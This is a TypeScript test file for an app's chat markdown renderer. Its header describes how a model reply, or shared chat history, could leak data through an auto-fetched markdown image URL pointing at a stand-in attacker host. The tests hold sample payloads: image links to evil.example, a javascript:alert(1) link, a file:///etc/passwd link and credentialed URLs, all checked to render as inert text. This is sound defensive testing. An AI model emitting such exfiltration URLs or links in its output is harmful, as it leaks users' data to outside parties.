/**
 * [B19-D I5c row 02] Chat markdown never makes the browser fetch a remote resource on its own.
 *
 * The assistant's markdown renderer (app/page.tsx) overrode links, code and tables but not images, so a model reply — or a
 * shared `.sirkit.json` project whose chat history carries one — rendered `![x](https://evil.example/b.svg?d=…)` as an
 * `<img>` the browser fetched the moment the chat was opened: an exfiltration channel for anything the model was talked
 * into writing into the URL. No Content-Security-Policy limited image sources either.
 */
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

async function render(markdown: string): Promise<string> {
  const mod = (await import("../ChatMarkdown")) as { ChatMarkdown: (props: { content: string }) => React.ReactElement };
  return renderToStaticMarkup(mod.ChatMarkdown({ content: markdown }));
}

describe("[B19-D I5c row 02] images in chat markdown are never fetched", () => {
  it.each([
    ["an inline image", "![x](https://evil.example/b.svg?d=1)"],
    ["a reference-style image", "![r][ref]\n\n[ref]: https://evil.example/r.png"],
    ["an image inside a table cell", "| a |\n|---|\n| ![t](https://evil.example/t.png) |"],
  ])("%s renders as text, with no <img> and no preload", async (_label, markdown) => {
    const html = await render(markdown);
    expect(html).not.toMatch(/<img\b/i);
    expect(html).not.toMatch(/rel="preload"/);
    expect(html).not.toContain("evil.example");
  });

  it("the alt text is still shown", async () => {
    expect(await render("![a diagram of the circuit](https://evil.example/b.svg)")).toContain("a diagram of the circuit");
  });

  it("links keep only web and mail destinations, open safely, and show where they go", async () => {
    const html = await render("[docs](https://www.digikey.com/x) [bad](javascript:alert(1)) [file](file:///etc/passwd)");
    expect(html).toMatch(/href="https:\/\/www\.digikey\.com\/x"[^>]*rel="noreferrer noopener"/);
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("file:///");
    expect(html).toContain(">(www.digikey.com)</span>");
  });

  // [review] react-markdown already empties javascript: and file:, so those assertions alone cannot tell the policy apart
  // from a plain pass-through. These destinations are ones react-markdown lets through.
  it.each([
    ["protocol-relative", "[x](//evil.example/x)"],
    ["an IP literal", "[x](https://127.0.0.1/x)"],
    ["credentials", "[x](https://u:p@evil.example/x)"],
    ["xmpp:", "[x](xmpp:a@evil.example)"],
    ["a relative app path", "[x](/api/projects)"],
    ["a local host name", "[x](https://intranet/x)"],
  ])("a %s link renders as text, not a link", async (_label, markdown) => {
    const html = await render(markdown);
    expect(html).not.toMatch(/<a\b/i);
    expect(html).toContain(">x<");
  });

  it("a mail link shows that it is email; a GFM autolink shows its host", async () => {
    expect(await render("[m](mailto:a@b.com)")).toMatch(/<a href="mailto:a@b\.com"[^>]*>m<span[^>]*>\(email\)<\/span><\/a>/);
    expect(await render("see www.example.com today")).toMatch(/<a href="http:\/\/www\.example\.com\/?"[^>]*>www\.example\.com<span[^>]*>\(www\.example\.com\)<\/span><\/a>/);
  });

  it("the page renders assistant markdown only through ChatMarkdown (tripwire on app/page.tsx)", async () => {
    const { readFileSync } = await import("node:fs");
    const page = readFileSync("app/page.tsx", "utf8");
    expect(page).not.toMatch(/<ReactMarkdown\b/);
    expect(page).toMatch(/<ChatMarkdown\b/);
  });
});

describe("[B19-D I5c row 02] the app declares where images may come from", () => {
  it("next.config sends an img-src policy of self, data: and blob: on every route", async () => {
    const config = (await import("../../../../next.config")).default as { headers?: () => Promise<Array<{ source: string; headers: Array<{ key: string; value: string }> }>> };
    expect(typeof config.headers).toBe("function");
    const rules = await config.headers!();
    const all = rules.find((rule) => rule.source === "/:path*");
    const csp = all?.headers.find((header) => header.key.toLowerCase() === "content-security-policy")?.value ?? "";
    expect(csp).toMatch(/img-src 'self' data: blob:/);
  });
});
